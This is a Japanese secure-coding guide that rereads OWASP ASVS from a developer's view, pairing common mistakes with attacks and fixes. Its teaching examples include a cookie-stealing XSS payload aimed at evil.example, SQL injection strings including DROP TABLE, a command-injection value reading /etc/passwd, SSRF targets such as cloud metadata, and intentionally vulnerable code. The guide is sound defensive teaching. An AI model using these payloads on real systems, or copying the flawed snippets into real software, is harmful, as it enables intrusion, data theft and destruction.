# 01. アプリを作るときに「穴」を作らないために

ASVS の要件は 345 件あります。でも、開発中に毎回 345 件を眺める人はいません。
この文書は逆向きに、**「この機能を作るとき、ここで穴を作りがち」**という開発者の目線で ASVS を読み直したものです。

各トピックは次の形にそろえています。

- **やりがちなこと** — 悪気なく書いてしまうコード
- **何が起きるか** — 攻撃者がそこをどう使うか
- **気をつけること** — 実装時のチェックポイント
- **ASVS** — 対応する要件（`L1` は最低限、`L2` は多くのアプリで目指すべき水準）

---

## 0. 先に覚えておきたい 6 つの原則

個別のテクニックより先に、この 6 つが身についていれば穴の大半は防げます。

| # | 原則 | ひとことで |
| --- | --- | --- |
| 1 | **クライアントから来るものは全部「攻撃者が書き換えられる」** | URL、フォーム、hidden 項目、Cookie、ヘッダ、JSON、ファイル名、ファイルの中身。フロントの JS で隠しても無意味 |
| 2 | **チェックはサーバー側で強制する** | フロントのバリデーションや「ボタンを非表示にする」のは UX のため。セキュリティは必ずサーバーで（V2.2.2, V8.3.1） |
| 3 | **データとコードを混ぜない** | SQL・HTML・シェルコマンドに値を文字列連結しない。プレースホルダやテンプレートのエスケープに任せる（V1 章全体） |
| 4 | **デフォルトは拒否** | 「ダメなもの」を列挙するのではなく「OK なもの」を許可リストで決める |
| 5 | **セキュリティ機能は自作しない** | 暗号、パスワードハッシュ、JWT 検証、HTML サニタイズ、セッション管理はフレームワークや実績あるライブラリを使う |
| 6 | **失敗したら閉じる（fail closed）** | 例外が起きたら「通す」のではなく「止める」（V16.5.3） |

## 1. 画面にユーザーの入力を表示するとき（XSS）

### やりがちなこと

```python
# テンプレートを使わず f-string で HTML を組み立てる
return f"<p>{comment}</p>"
```

```jsx
// React で「リッチテキストを出したいから」と生 HTML を流し込む
<div dangerouslySetInnerHTML={{ __html: user.bio }} />
```

```js
// 素の JS で innerHTML に入れる
el.innerHTML = data.name;
```

### 何が起きるか

コメント欄に `<script>fetch('https://evil.example/?c='+document.cookie)</script>` を書かれると、
**そのページを見た他のユーザーのブラウザ**で攻撃者のスクリプトが動きます。セッションを盗まれる、勝手に送金される、画面を偽のログインフォームに書き換えられる、などが起きます。

### 気をつけること

- HTML は**テンプレートエンジンの自動エスケープ**に任せる（Jinja2、Django、React の `{}` など）。自動エスケープを切る機能（`|safe`、`dangerouslySetInnerHTML`、`v-html`、`innerHTML`）を使う箇所はコードレビューで必ず止める。
- JS でテキストを入れるときは `textContent` を使う（V3.2.2）。
- **リンクの URL** にも注意。`<a href="{{ url }}">` は、エスケープしても `javascript:alert(1)` が通ります。`http` / `https` だけを許可する（V1.2.2）。
- `<script>` の中に JSON を埋め込むときは `</script>` で抜けられないようにする（V1.2.3）。
- どうしてもユーザーに HTML を書かせる（WYSIWYG エディタなど）なら、DOMPurify などの**実績あるサニタイザ**を通す（V1.3.1）。
- 保険として **CSP** を設定する（V3.4.3）。XSS があっても被害を小さくできます。

**ASVS**: V1.2.1 `L1` / V1.2.2 `L1` / V1.2.3 `L1` / V1.3.1 `L1` / V3.2.2 `L1` / V3.4.3 `L2`
**演習**: [Lab 02](../labs/lab02_output_encoding/), [Lab 07](../labs/lab07_security_headers/)

## 2. データベースを検索するとき（SQL インジェクション）

### やりがちなこと

```python
cur.execute(f"SELECT * FROM users WHERE email = '{email}'")

# 「ORM を使っているから安全」と思いつつ、生 SQL の逃げ道で連結
User.objects.raw(f"SELECT * FROM users ORDER BY {request.GET['sort']}")
```

### 何が起きるか

`email` に `' OR '1'='1` を入れられると全件取得、`'; DROP TABLE users; --` で破壊、`UNION SELECT` で別テーブル（パスワードハッシュなど）の読み出し。**1 か所あるだけで DB 全体が漏れる**種類の穴です。

### 気をつけること

- 値は必ず**プレースホルダ**で渡す（`?` / `%s` / `:name`）。ORM を使う場合も `raw()` / `extra()` / 文字列で組んだ `where` は要注意。
- **カラム名・テーブル名・`ORDER BY`・`ASC/DESC` はプレースホルダにできない**。ここは許可リストで「`name` か `price` だけ」のように固定する。ソート機能やフィルタ機能を作るときに一番やらかしやすいポイントです。
- NoSQL（MongoDB の `{"$ne": null}` など）、LDAP、XPath も同じ発想で守る（V1.2.4, V1.2.6, V1.2.7）。

**ASVS**: V1.2.4 `L1`
**演習**: [Lab 01](../labs/lab01_sql_injection/)

## 3. 外部コマンドを実行したり、外部 URL を取りに行くとき

### やりがちなこと

```python
# 画像変換・PDF 生成・ping 機能などで
os.system(f"convert {filename} out.png")
subprocess.run(f"ping -c 1 {host}", shell=True)

# 「URL を入れるとプレビューを表示する」機能
requests.get(request.json["url"])
```

### 何が起きるか

- コマンド: `host` に `8.8.8.8; cat /etc/passwd` を入れられてサーバー上で任意コマンド実行（V1.2.5）。
- URL 取得（**SSRF**）: `http://169.254.169.254/latest/meta-data/`（クラウドのメタデータ）や `http://localhost:6379/`（社内の Redis）など、**外からは届かないはずの内部ネットワーク**にサーバー経由でアクセスされる。クラウドの認証情報が盗まれる典型ルートです（V1.3.6）。

### 気をつけること

- `shell=True` を使わず、引数は**リスト**で渡す: `subprocess.run(["ping", "-c", "1", host])`。そもそもライブラリで代替できないか考える。
- 外部 URL を取りに行く機能は、**スキーム・ドメイン・ポートを許可リストで**制限する。IP アドレスに解決したあとプライベート IP / リンクローカルでないかも確認する。
- **リダイレクトを自動で追わない**（V15.3.2）。許可済みドメインから内部 URL へリダイレクトされて突破されます。
- `eval()` や動的コード実行は使わない（V1.3.2）。

**ASVS**: V1.2.5 `L1` / V1.3.2 `L1` / V1.3.6 `L2` / V15.3.2 `L2`

## 4. 会員登録・ログインを作るとき

### やりがちなこと

- 「大文字・数字・記号を必ず含む、8〜16 文字」というルールにする
- パスワードを `md5(password)` や `sha256(password)` で保存する
- ログイン失敗時に「そのメールアドレスは登録されていません」「パスワードが違います」と出し分ける
- ログイン試行の回数制限がない
- 初期データに `admin / admin` が残ったまま本番に出る

### 何が起きるか

- 複雑性ルールは `Password1!` のような**予測しやすいパスワード**を量産するだけ。最大長が短いとパスフレーズが使えない。
- 高速なハッシュは、DB が漏れたときに GPU で一瞬で総当たりされる。
- メッセージの出し分けで「このメールアドレスは会員だ」と分かり、**別サービスから漏れたパスワードを試す攻撃（クレデンシャルスタッフィング）**の的を絞られる。
- 回数制限がなければ、総当たりもスタッフィングもやり放題。

### 気をつけること

- **長さ重視**: 8 文字以上（15 文字以上を強く推奨）、64 文字以上を許可。文字種ルールは**課さない**。代わりに、よく使われるパスワードのリストと照合して拒否する（V6.2.1, V6.2.4, V6.2.5, V6.2.9）。
- パスワードを**切り詰めたり小文字化したりしない**（V6.2.8）。
- 保存は **Argon2id / scrypt / bcrypt / PBKDF2** などの「わざと遅い」ハッシュ関数で（V11.4.2）。自前で `sha256` を回さない。
- **レート制限・アカウントロック・CAPTCHA** などでブルートフォースとスタッフィングに備える（V6.3.1）。
- デフォルトアカウントを残さない（V6.3.2）。
- L2 を目指すなら **MFA（多要素認証）が必須**（V6.3.3）。
- L3 ではエラーメッセージ・ステータスコード・**応答時間の差**からもユーザーの存在を推測されないこと（V6.3.8）。

**ASVS**: V6.2.x `L1–L2` / V6.3.1 `L1` / V6.3.2 `L1` / V6.3.3 `L2` / V11.4.2 `L2`
**演習**: [Lab 03](../labs/lab03_password_storage/)

## 5. パスワードリセット・ワンタイムコードを作るとき

### やりがちなこと

- 「秘密の質問（母親の旧姓は？）」を用意する
- リセット用トークンや確認コードを `random.randint()` や連番、`uuid1()` で作る
- リセットリンクに有効期限がない、何度でも使える
- パスワードをリセットすると **MFA もスキップしてログインできる**

### 気をつけること

- 秘密の質問・パスワードのヒントは置かない（V6.4.2）。
- トークン・コードは **CSPRNG**（Python なら `secrets`）で生成する（V6.5.3, V11.5.1）。`random` モジュールは予測可能です。
- **一度使ったら無効**（V6.5.1）、**短い有効期限**（メール等の帯域外コードは最大 10 分、V6.5.5）。
- リセットで **MFA を迂回させない**（V6.4.3）。
- 管理者が「ユーザーのパスワードを決めて設定する」機能にしない（V6.4.6）。

**ASVS**: V6.4.2 `L1` / V6.4.3 `L2` / V6.5.1 `L2` / V6.5.3 `L2` / V6.5.5 `L2`

## 6. ログイン後の状態（セッション）を扱うとき

### やりがちなこと

- ログイン前に発行したセッション ID を、ログイン後もそのまま使い続ける
- ログアウトで Cookie を消すだけで、サーバー側のセッションは残っている
- セッション Cookie に `HttpOnly` も `Secure` も付いていない
- 「ログインしたまま」を実現するため、有効期限を無期限にする
- セッション ID や API キーを **URL のクエリ**に載せる

### 何が起きるか

- **セッション固定攻撃**: 攻撃者が用意したセッション ID を被害者に使わせ、被害者がログインした瞬間に攻撃者もログイン済みになる。
- ログアウトしても、盗まれた Cookie で引き続きアクセスされる。
- `HttpOnly` がないと、XSS が 1 つあるだけでセッションを盗まれる。
- URL に載ったトークンは、アクセスログ・ブラウザ履歴・`Referer` ヘッダ経由で外部に漏れる。

### 気をつけること

- **ログイン（再認証を含む）のたびにセッション ID を作り直し、古いものは破棄**（V7.2.4）。
- ログアウト・期限切れでは**サーバー側で**無効化する（V7.4.1）。アカウントを無効化・削除したら全セッションを終了（V7.4.2）。
- 無操作タイムアウトと絶対的な最大寿命を決めて実装する（V7.3.1, V7.3.2）。
- Cookie は `__Host-` プレフィックス + `Secure` + `HttpOnly` + `SameSite`（V3.3.1〜V3.3.4）。
- 機微な値は URL に載せず、ヘッダかボディで送る（V14.2.1）。

**ASVS**: V7.2.4 `L1` / V7.4.1 `L1` / V7.4.2 `L1` / V7.3.1–2 `L2` / V3.3.1 `L1` / V3.3.2–4 `L2` / V14.2.1 `L1`
**演習**: [Lab 06](../labs/lab06_session/)

## 7. 「自分のデータだけ」見せる・編集させるとき（認可）⚠️ 最重要

実務の脆弱性診断で**最も多く見つかる**のがこの種類です。フレームワークが自動では守ってくれないため、開発者が毎回意識する必要があります。

### やりがちなこと

```python
# ① ログインチェックだけして、誰のデータかは見ていない（IDOR / BOLA）
@app.get("/api/orders/<int:order_id>")
@login_required
def get_order(order_id):
    return Order.get(order_id).to_dict()

# ② リクエストの JSON をそのままモデルに流し込む（Mass Assignment / BOPLA）
user.update(**request.json)       # {"role": "admin"} を送られたら？

# ③ モデルを丸ごと返す
return user.to_dict()             # password_hash や内部メモまで返していないか？

# ④ 管理画面へのリンクを UI で隠しているだけ
```

### 何が起きるか

- ① URL の `order_id` を 1 ずつ変えるだけで**全ユーザーの注文**が見える。UUID にしても、ID がどこかで漏れれば同じこと。
- ② 自分のプロフィール更新 API に `"role": "admin"` や `"price": 0` を混ぜて送られる。
- ③ 画面には出していなくても、API のレスポンスを開発者ツールで見れば丸見え。
- ④ `/admin/...` を直接叩かれる。

### 気をつけること

- **「ID で取る」ではなく「このユーザーが触れる範囲の中から ID で取る」**。クエリの条件に所有者やテナントを必ず入れる（V8.2.2）。

  ```python
  order = Order.query.filter_by(id=order_id, user_id=current_user.id).first_or_404()
  ```

- 他人のデータと存在しないデータは**同じ応答**（404 など）にして、存在を漏らさない。
- 更新できるフィールドは**許可リスト**で決める（V8.2.3, V15.3.3）。ロールごとに変わるならロールごとに定義する。
- レスポンスは**必要なフィールドだけ**返す（V15.3.1）。シリアライザ／DTO を用意する。
- すべてのエンドポイントに「誰が実行できるか」を明示し、**デフォルト拒否**にする（V8.2.1）。
- 認可は**サーバー側で**判定する（V8.3.1）。
- マルチテナントのアプリでは、テナント ID の付け忘れが致命傷になる。リポジトリ層やクエリビルダで自動付与する仕組みを作るのがおすすめ（V8.4.1）。

**ASVS**: V8.2.1 `L1` / V8.2.2 `L1` / V8.3.1 `L1` / V8.2.3 `L2` / V15.3.1 `L1` / V15.3.3 `L2`
**演習**: [Lab 04](../labs/lab04_idor/)

## 8. API と JWT を扱うとき

### やりがちなこと

```python
# 署名を検証せずにデコードだけしている
claims = jwt.decode(token, options={"verify_signature": False})

# アルゴリズムをトークンのヘッダ任せにしている
claims = jwt.decode(token, key)  # algorithms を指定していない

# 他のサービス向けに発行されたトークンも受け入れてしまう（aud を見ていない）
```

### 何が起きるか

- 署名を見ていなければ、ペイロードの `"sub": "admin"` に書き換えたトークンがそのまま通る。
- `alg: none` や、公開鍵を HMAC の鍵として使わせる「アルゴリズム混同」で署名を偽造される。
- 別サービス向けのトークンを使い回される。

### 気をつけること

- **署名を検証してから**中身を使う（V9.1.1）。
- アルゴリズムは**サーバー側の許可リスト**で固定する。`none` は絶対に入れない（V9.1.2）。
- `exp` / `nbf` を検証する（V9.2.1）。`aud` が自分向けかを検証する（V9.2.3）。
- 鍵はトークンのヘッダ（`jku` / `x5u` / `jwk`）から取らず、事前に設定した信頼できる場所から（V9.1.3）。
- JWT は**発行後に取り消しにくい**。権限変更・ログアウトをすぐ反映させたいなら、短い有効期限や失効リストを用意する（V7.4.1, V8.3.2）。
- レスポンスの `Content-Type` を正しく付ける（V4.1.1）。

**ASVS**: V9.1.1–3 `L1` / V9.2.1 `L1` / V9.2.3 `L2` / V4.1.1 `L1`
**演習**: [Lab 08](../labs/lab08_jwt_verification/)

## 9. ファイルアップロードを作るとき

### やりがちなこと

```python
f = request.files["file"]
f.save(os.path.join(UPLOAD_DIR, f.filename))        # ファイル名そのまま
if f.filename.endswith(".png"): ...                  # 拡張子だけ見る
zipfile.ZipFile(f).extractall(dest)                  # 中身を確認せず展開
```

### 何が起きるか

- ファイル名 `../../app/templates/index.html` で**任意の場所に上書き**（パストラバーサル）。
- `shell.php` や `shell.png.php` をアップロードされ、公開フォルダに置かれて**サーバー上で実行**される。
- 中身が HTML や SVG の「画像」を同じドメインで配信して XSS。
- 数 KB の zip を展開すると数 GB になる**zip 爆弾**でディスクを埋められる。zip 内の `../../` パスで任意の場所に書き込まれる（**Zip Slip**）。

### 気をつけること

- 保存名は**サーバー側で生成**（ランダム名 + 許可した拡張子）。元のファイル名を使うなら DB に別で保存（V5.3.2）。
- 拡張子を許可リストで確認し、**中身（マジックバイト）も一致するか**確認する。画像なら再エンコードするとより安全（V5.2.2）。
- **サイズ上限**を設ける（V5.2.1）。zip は展開**前**に展開後サイズとファイル数をチェックする（V5.2.3）。
- アップロードしたファイルが**サーバー側コードとして実行されない**場所・設定で保存する（V5.3.1）。
- 可能なら別ドメインやオブジェクトストレージから配信し、`Content-Disposition: attachment` や `X-Content-Type-Options: nosniff` を付ける（V3.2.1, V3.4.4）。

**ASVS**: V5.2.1 `L1` / V5.2.2 `L1` / V5.3.1 `L1` / V5.3.2 `L1` / V5.2.3 `L2` / V5.3.3 `L3`
**演習**: [Lab 05](../labs/lab05_file_upload/)

## 10. お金・ポイント・在庫・予約などのビジネスロジック

ツールで機械的に見つけにくく、**仕様を知っている人にしか気づけない**穴です。

### やりがちなこと

- 購入数量や金額をクライアントから受け取り、そのまま使う
- 「カート → 配送先 → 支払い → 完了」の途中のステップを飛ばせる
- クーポンを「使用済みか確認 → 使用済みにする」の 2 ステップで処理する
- ポイント加算と残高更新が別のトランザクションになっている

### 何が起きるか

- 数量 `-1` や価格 `0` を送られる。
- 支払いステップを飛ばして完了 URL を直接叩かれる。
- **同時に 10 リクエスト**を送られると、全部が「未使用」と判定されてクーポンが 10 回使える（レースコンディション / TOCTOU）。座席の二重予約も同じ。
- 途中でエラーが起きたとき、ポイントだけ加算されて決済は失敗、のような中途半端な状態が残る。

### 気をつけること

- 値段・合計金額などは**サーバー側で計算**する。入力値は許可リスト・範囲で検証する（V2.2.1）。
- 関連する値の組み合わせも検証する（例: 開始日 < 終了日、V2.2.3）。
- フローは**決まった順番でしか進めない**ようにサーバー側で状態管理する（V2.3.1）。
- 1 回あたり・1 日あたりなどの**上限**をドキュメントに決めて実装する（V2.3.2）。
- 複数の更新は**トランザクション**でまとめる（V2.3.3）。
- 限られた数量のリソースは**ロック**や `UPDATE ... WHERE used = false` のような**アトミックな操作**で守る（V2.3.4, V15.4.2）。
- 大量アクセスで悪用される機能（SMS 送信、ポイント付与、データエクスポートなど）にはレート制限を入れる（V2.4.1）。

**ASVS**: V2.2.1 `L1` / V2.3.1 `L1` / V2.2.3 `L2` / V2.3.2–4 `L2` / V2.4.1 `L2` / V15.4.2 `L3`

## 11. フロントエンドと別ドメインの関係（CORS / CSRF / ヘッダ）

### やりがちなこと

```python
# 「CORS エラーが出たから」とりあえず全部許可
response.headers["Access-Control-Allow-Origin"] = request.headers["Origin"]
response.headers["Access-Control-Allow-Credentials"] = "true"
```

- 状態を変える処理（削除・送金・設定変更）を `GET` で実装する
- セキュリティヘッダを何も設定していない

### 何が起きるか

- Origin をそのまま返していると、**どのサイトからでも**ログイン中ユーザーの権限で API を呼んでデータを読まれる。
- `GET /delete?id=1` は `<img src=...>` を埋め込むだけで踏ませられる（CSRF）。
- iframe で自サイトを埋め込まれ、透明なボタンを押させられる（クリックジャッキング）。

### 気をつけること

- CORS は**許可リストと完全一致**で判定する。`endsWith("example.com")` のような判定は `evil-example.com` に負ける（V3.4.2）。
- 状態を変える処理は `POST` / `PUT` / `PATCH` / `DELETE` にする（V3.5.3）。CSRF トークンや `Origin` / `Sec-Fetch-*` の検証、`SameSite` Cookie と組み合わせる（V3.5.1, V3.3.2）。
- 最低限のヘッダ: `Strict-Transport-Security`（V3.4.1）、`Content-Security-Policy`（`frame-ancestors` を含む、V3.4.3, V3.4.6）、`X-Content-Type-Options: nosniff`（V3.4.4）、`Referrer-Policy`（V3.4.5）。
- `postMessage` を受け取るときは送信元の origin を確認する（V3.5.5）。

**ASVS**: V3.4.1 `L1` / V3.4.2 `L1` / V3.5.1 `L1` / V3.5.3 `L1` / V3.3.2 `L2` / V3.4.3–6 `L2` / V3.5.5 `L2`
**演習**: [Lab 07](../labs/lab07_security_headers/)

## 12. エラー処理とログ

### やりがちなこと

- 本番で**スタックトレースや SQL 文**が画面に出る
- `try: ... except: pass` で例外を握りつぶして処理を続ける
- デバッグのために、リクエスト全体（パスワード・トークン・カード番号）をログに出す
- ユーザー入力をそのままログに書く
- ログイン失敗や権限エラーを記録していない

### 何が起きるか

- エラー画面からテーブル名・ライブラリのバージョン・内部パスが漏れ、攻撃の手がかりになる。
- 検証で例外が出たのに処理が続き、**チェックをすり抜ける**（fail open）。
- ログが漏れたら認証情報も漏れる。ログを見られる社内の人全員が、パスワードを見られることになる。
- 改行を含む入力で偽のログ行を作られる（ログインジェクション）。
- 攻撃を受けていても気づけない。事後の調査もできない。

### 気をつけること

- 利用者には**一般的なエラーメッセージ**だけ返す。詳細はサーバーのログへ（V16.5.1）。
- 例外時は**処理を止める**（V16.5.3）。外部サービスが落ちても安全側に倒れるようにする（V16.5.2）。
- 認証の成功・失敗（V16.3.1）、認可の失敗（V16.3.2）、バリデーションをすり抜けようとした試行（V16.3.3）を記録する。
- ログには「いつ・どこで・誰が・何を」を入れ、時刻は UTC か、タイムゾーン付きで記録する（V16.2.1, V16.2.2）。
- ログに書く値は**エンコード**する（V16.4.1）。構造化ログ（JSON）にすると安全かつ扱いやすい。
- 機微データはログに出さないか、マスクする（V14.2.4）。

**ASVS**: V16.2.1–2 `L2` / V16.3.1–3 `L2` / V16.4.1 `L2` / V16.5.1–3 `L2` / V14.2.4 `L2`

## 13. 設定・シークレット・デプロイ

### やりがちなこと

- API キーや DB パスワードをソースコードや `.env` ごと Git にコミットする
- 本番で `DEBUG=True` のまま
- `/.git/`、`/swagger`、`/actuator`、`/phpinfo.php` が外から見える
- サンプルコードやテスト用エンドポイントが本番に残っている

### 何が起きるか

- 公開リポジトリにキーを push すると、**数分で自動収集**されて悪用される（クラウドの高額請求など）。
- デバッグ画面からコードの実行や環境変数の閲覧ができてしまうフレームワークもある。
- `.git` が見えるとソースコードを丸ごと復元される。

### 気をつけること

- シークレットは**シークレット管理サービス**（AWS Secrets Manager、GCP Secret Manager、Vault など）に置く。最小権限でアクセスさせる（V13.3.1, V13.3.2）。
- `gitleaks` などのシークレットスキャンを CI や pre-commit に入れる。
- `.git` などのメタデータをデプロイしない（V13.4.1）。本番のデバッグモードはオフ（V13.4.2）。API ドキュメントや監視用エンドポイントは意図したとき以外は公開しない（V13.4.5）。
- テストコードや開発用の機能を本番に含めない（V15.2.3）。

**ASVS**: V13.4.1 `L1` / V13.3.1–2 `L2` / V13.4.2 `L2` / V13.4.5 `L2` / V15.2.3 `L2`

## 14. ライブラリ・依存パッケージ

### やりがちなこと

- `npm install` / `pip install` したまま何年も更新しない
- 既知の脆弱性の警告（Dependabot など）を放置する
- 社内パッケージと同じ名前の公開パッケージを誤ってインストールする

### 気をつけること

- **アップデートと修正の期限**（例: Critical は 7 日以内）をチームで決め、それを守る（V15.2.1）。Dependabot / Renovate で自動化する。
- ロックファイル（`package-lock.json`、`poetry.lock` など）をコミットする。
- 社内パッケージは scope やレジストリ設定で取得元を固定し、**依存関係の取り違え（dependency confusion）**を防ぐ（V15.2.4）。

**ASVS**: V15.2.1 `L1` / V15.2.4 `L3`

## 15. 乱数・暗号

### やりがちなこと

```python
token = str(random.random())          # 予測可能
token = str(uuid.uuid4())             # ASVS は UUID を「推測不可能な値」と認めていない
hashlib.md5(data).hexdigest()         # 改ざん検知や署名に使ってはいけない
AES.new(key, AES.MODE_ECB)            # パターンが残る
```

### 気をつけること

- 推測されてはいけない値（トークン、リセットコード、セッション ID）は **CSPRNG で 128 ビット以上**: `secrets.token_urlsafe(32)`（V11.5.1）。
- MD5 / SHA-1 を暗号用途に使わない（V11.4.1）。
- 暗号は**認証付き暗号（AES-GCM など）**を、実績あるライブラリの高レベル API で使う。モードや IV を自分で組み立てない（V11 章、付録 C）。
- 鍵はコードに書かない（→ 13 章）。

**ASVS**: V11.4.1 `L1` / V11.5.1 `L2`
